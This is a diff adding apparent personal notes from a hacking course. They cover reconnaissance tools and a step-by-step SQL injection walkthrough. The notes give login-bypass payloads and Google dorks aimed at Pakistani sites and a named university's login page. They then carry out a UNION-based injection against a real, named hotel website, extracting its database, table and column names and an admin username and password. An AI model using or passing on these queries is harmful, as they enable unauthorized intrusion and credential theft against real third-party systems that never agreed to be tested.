@@ -1,0 +1,142 @@
+My IP address - 42.110.142.131
+
+Info Gathering
+
+-Domain Control
+-Server Control
+DNS - domain name server
+
+IP addresses
+1. Whois - centralised database
+who.is
+whois.net
+
+2. Reverse IP Mapping - domains hosted on same server
+yougetsignal.com (reverse ip domain check)
+
+3. Proxy Server (maintain logs) & VPN - Virtual Private Network (Does not maintain logs)
+kproxy.com
+boomproxy.com
+hidemyass.com
+
+Control panel-network-setup
+IP, Username, password
+
+vpngate.net
+
+-Ports
+65535 - tunnels
+
+http://- 80
+https:// - 443 (SECURED for users and hackers!)
+
+
+1. Basic SQL Injection:
+SQL - Structured Query Language
+
+select * from member where userid="name" and password="....";
+
+Step 1- find out login page of website:
+site: srmuniv.ac.in (username/password)
+srmuniv.ac.in inurl:/login
+
+Pakistani Websites - pk inurl:/login
+
+User: admin/administrator
+Pw: admin
+select * from member where userid="admin" and password="admin";
+
+User: admin/administrator
+Pw: 0'or'0'='0
+    1'or'1'='1
+
+select * from member where userid="admin" and password="0'or'0'='0";
+(Limitation - Password should accept single quotes and username should be admin)
+
+2. Advanced SQL Injection:
+
+select - select infofrom database
+insert - insert values
+create - create table
+drop - drop table
+order by - sorting columns
+schema - structure of database
+' - starting of SQL values/commands
+
+-http://site.com/news.php?id=10
+-http://site.com/news/10
+(? = ask from database)
+(id = 1st column of the table)
+
+Step 1: Find out link which contains ?id=10
+pk inurl:php(asp/aspx/jsp)?id=
+
+http://hotelornate.com.pk/leftmenubody.php?id=56
+
+Step 2: Add (') after ?id=no. 
+
+http://hotelornate.com.pk/leftmenubody.php?id=56'
+
+blank page == error page == vulnerable (for a blank page)
+
+Step 3: Find out no. of vulnerable links
+
+http://hotelornate.com.pk/leftmenubody.php?
+id=56 order by 1 --
+(-- : end of query)
+
+8 vulnerable links
+
+Step 4: Find out link from which we can select data
+
+http://hotelornate.com.pk/leftmenubody.php?
+id=-56 union all select 1,2,3,4,5,6,7,8 --
+(- is used so that id becomes reference and 56 is not considered)
+
+we can select data from 2 or 6
+
+Step 5: Find out names of database, rows and columns
+id=-56 union all select 1,2,3,4,5,database(),7,8 --
+
+database: ornate_ornate
+
+schema - structure of database
+information_schema - stores info
+
+table_name
+information_schema.tables
+
+column_name
+information_schema.columns
+
+id=-56 union all select 1,2,3,4,5,group_concat(table_name),7,8 from information_schema.tables where table_schema=database() --
+
+(group_concat : groups table names)
+(table_schema=database() : shows database primarily)
+
+lito_user : table
+
+id=-56 union all select 1,2,3,4,5,group_concat(column_name),7,8 from information_schema.columns where table_name='lito_user' --
+
+table: lito_user
+columns: Id,Username,Password,FullName,Email
+
+Step 6: Find out row values
+
+id=-56 union all select 1,2,3,4,5,Username,7,8 from lito_user --
+id=-56 union all select 1,2,3,4,5,Password,7,8 from lito_user --
+
+Username: admin
+Password: admin
+
+hackerone.com
+bugcrowd.com
+
+burptool - run this along with an app on emulator (for an app with url)
+
+bit.ly/hacktrack_1
+bit.ly/hacktrack_2
+bit.ly/hacktrack_3
+bit.ly/hacktrack_4
+
+*Havij : Automated injector*
